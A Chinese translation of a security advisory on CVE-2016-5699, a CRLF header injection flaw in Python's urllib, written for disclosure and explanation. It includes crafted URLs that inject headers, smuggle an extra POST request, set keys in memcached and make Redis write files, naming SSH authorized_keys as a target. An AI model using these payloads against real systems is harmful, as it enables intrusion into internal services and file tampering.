# Python urllib HTTP头注入漏洞

from:[http://blog.blindspotsecurity.com/2016/06/advisory-http-header-injection-in.html](http://blog.blindspotsecurity.com/2016/06/advisory-http-header-injection-in.html)

0x00 总览
=======

* * *

Python的urllib库（在Python2中为`urllib2`，在Python3中为`urllib`）有一个HTTP协议下的协议流注入漏洞。如果攻击者可以控制Python代码访问任意URL或者让Python代码访问一个恶意的web servr，那这个漏洞可能会危害内网服务安全。

0x01 问题在哪
=========

* * *

HTTP协议解析host的时候可以接受百分号编码的值，解码，然后包含在HTTP数据流里面，但是没有进一步的验证或者编码，这就可以注入一个换行符。

```
#!/usr/bin/env python3  

import sys
import urllib
import urllib.error
import urllib.request   

url = sys.argv[1]   

try:
    info = urllib.request.urlopen(url).info()
    print(info)
except urllib.error.URLError as e:
    print(e)

```

这段代码只是从命令行参数接收一个URL，然后去访问它。为了查看`urllib`获取的HTTP头，我们用一个nc来监听端口。

```
nc -l -p 12345

```

在正常的代码中，我们可以这样访问

```
./fetch3.py http://127.0.0.1:12345/foo

```

返回的HTTP头是

```
GET /foo HTTP/1.1
Accept-Encoding: identity
User-Agent: Python-urllib/3.4
Connection: close
Host: 127.0.0.1:12345

```

然后我们使用恶意构造的地址

```
./fetch3.py http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo

```

返回的HTTP头就是

```
GET /foo HTTP/1.1
Accept-Encoding: identity
User-Agent: Python-urllib/3.4
Host: 127.0.0.1
X-injected: header
x-leftover: :12345
Connection: close

```

然后攻击者可以任意注入HTTP头了。

这个攻击在使用域名的时候也可以进行，但是要插入一个空字节才能进行DNS查询。比如说，下面的URL进行解析会失败的。

```
http://localhost%0d%0ax-bar:%20:12345/foo

```

但是下面的URL是可以正常解析并访问到127.0.0.1的

```
http://localhost%00%0d%0ax-bar:%20:12345/foo

```

要注意的是HTTP重定向也可以利用这个漏洞，如果攻击者提供的URL是一个恶意的web server，然后服务器可以重定向到其他的URL也可以导致协议注入。

0x02 攻击面
========

* * *

下面会讨论几个可能导致严重后果的攻击方式。当然还远远不够，攻击都需要特定的场景，有很多不同的方法可以利用，还不能确定有没有其他的利用方式。

HTTP头注入和请求伪造
------------

这个攻击方式由来已久了，但是和[以前的请求伪造](http://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf)不同的是，这里仅仅是可以注入额外的HTTP头和请求方法。当然当前场景下，能够提交不同的HTTP方法和请求数据就已经很有用了，比如说原始的请求是这样的

```
GET /foo HTTP/1.1
Accept-Encoding: identity
User-Agent: Python-urllib/3.4
Host: 127.0.0.1
Connection: close

```

攻击者可以注入一个额外的完整的HTTP请求头

```
http://127.0.0.1%0d%0aConnection%3a%20Keep-Alive%0d%0a%0d%0aPOST%20%2fbar%20HTTP%2f1.1%0d%0aHost%3a%20127.0.0.1%0d%0aContent-Length%3a%2031%0d%0a%0d%0a%7b%22new%22%3a%22json%22%2c%22content%22%3a%22here%22%7d%0d%0a:12345/foo

```

这个的响应是

```
GET /foo HTTP/1.1
Accept-Encoding: identity
User-Agent: Python-urllib/3.4
Host: 127.0.0.1
Connection: Keep-Alive  

POST /bar HTTP/1.1
Host: 127.0.0.1
Content-Length: 31  

{"new":"json","content":"here"}
:12345
Connection: close

```

demo中注入的完整的请求头在Apache HTTPD下是工作的，但是其他的server不一定能正确的解析或者利用。这种攻击可以用在内网攻击上，比如未授权的REST、SOAP或者类似的服务[Exploiting Server Side Request Forgery on a Node/Express Application (hosted on Amazon EC2)](http://sethsec.blogspot.com/2015/12/exploiting-server-side-request-forgery.html)

攻击memcached
-----------

在[memcached文档](https://github.com/memcached/memcached/blob/master/doc/protocol.txt)中，memcached会开放几个简单的网络协议接口供缓存数据读取和存储使用。一般来说，这种mamcached都是部署在应用服务器上，这样多个实例之间共享数据或者进行一些操作就会比较快，不用进行数据库操作了。要注意的是，memcached默认是都没有密码保护的。开发者或者管理员一般也是认为内网的应用是无法被攻击的。

这样，如果我们可以控制内网的Python访问一个URL，然后我们就可以轻松的访问memcached了，比如

```
http://127.0.0.1%0d%0aset%20foo%200%200%205%0d%0aABCDE%0d%0a:11211/foo

```

就会产生下面的HTTP头

```
GET /foo HTTP/1.1
Accept-Encoding: identity
Connection: close
User-Agent: Python-urllib/3.4
Host: 127.0.0.1
set foo 0 0 5
ABCDE
:11211

```

当检查下面几行memcached的协议语法的时候，大部分都是语法错误，但是memcached在收到错误的命令的时候并不会关闭连接，这样攻击者就可以在请求的任何位置注入命令了，然后memcached就会执行。下面是memcached的响应（memcached是Debian下包管理默认配置安装的）

```
ERROR
ERROR
ERROR
ERROR
ERROR
STORED
ERROR
ERROR

```

经过确认，memcached中确实成功的插入了`foo`的值。这种场景下，攻击者就可以给内网的memcached实例发送任意命令了。如果应用依赖于memcached中存储的数据（比如用户的session数据，HTML或者其他的敏感数据），攻击者可能获取应用更高的权限了。这个利用方式还可以造成拒绝服务攻击，就是攻击者可以在memcached中存储大量的数据。

攻击Redis
-------

Redis和memcached很相似，因为都提供了数据备份存储，一些内置数据类型，还能执行Lua脚本。前几年Quite a bit公布了攻击Redis的一些方法（[链接1](https://benmmurphy.github.io/blog/2015/06/04/redis-eval-lua-sandbox-escape/)[链接2](http://antirez.com/news/96)[链接3](http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html)）。和memcached类似，Redis提供了TCP协议的接口，然后也可以执行一堆错误命令中的正确命令。另外，还可以利用Redis在写任意文件，攻击者可以控制一部分文件内容。比如下面的URL在`/tmp/evil`下创建了一个数据库文件。

```
http://127.0.0.1%0d%0aCONFIG%20SET%20dir%20%2ftmp%0d%0aCONFIG%20SET%20dbfilename%20evil%0d%0aSET%20foo%20bar%0d%0aSAVE%0d%0a:6379/foo

```

然后可以看到刚才存储的一些键值对数据

```
# strings -n 3 /tmp/evil
REDIS0006
foo
bar

```

理论上，攻击者就可以利用Redis创建或者改写一些敏感文件了，包括

```
 ~redis/.profile
 ~redis/.ssh/authorized_keys
...

```

0x03 多版本的Python都受到影响
====================

* * *

Python 2和3版本都受到影响，Cedric Buissart 提供了修复问题的部分信息。

3.4 / 3.5 :[revision 94952](https://hg.python.org/cpython/rev/bf3e1c9b80e9)  
2.7 :[revision 94951](https://hg.python.org/cpython/rev/1c45047c5102)

虽然已经在最新的版本中修复了，但是很多系统的稳定版是没法得到修复的，比如最新的Debian Stable就还存在这个漏洞。

0x04 我的一点思考
===========

* * *

Redis和memcached的开发者提供的默认配置是没有密码的，这个是不负责任的。当然，我能理解他们认为这些东西应该在"可信的内网"中使用。问题，实际上很少的内网能比外网更安全。未授权的服务即使监听在localhost，也会受到影响的。在安装过程中加一个随机生成的密码也并不难，开发者应该严肃的面对安全问题。

0x05 译者注
========

* * *

*   这个漏洞编号是 CVE-2016-5699，RedHat给申请的 http://www.openwall.com/lists/oss-security/2016/06/14/7
*   以前Python bugs中的讨论 https://bugs.python.org/issue22928